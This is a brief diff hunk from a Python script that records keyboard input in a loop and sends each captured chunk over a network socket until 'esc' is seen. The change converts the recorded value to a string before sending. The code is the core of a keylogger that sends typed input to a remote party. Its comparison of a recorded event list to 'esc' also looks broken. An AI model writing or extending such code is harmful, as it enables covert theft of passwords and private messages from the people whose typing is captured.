@@ -14,5 +14,5 @@ while 1:
     text = keyboard.record()
     if text == "esc":
         break
-    s.send(bytes(text, 'UTF-8'))
+    s.send(bytes(str(text), 'UTF-8'))
 s.close()
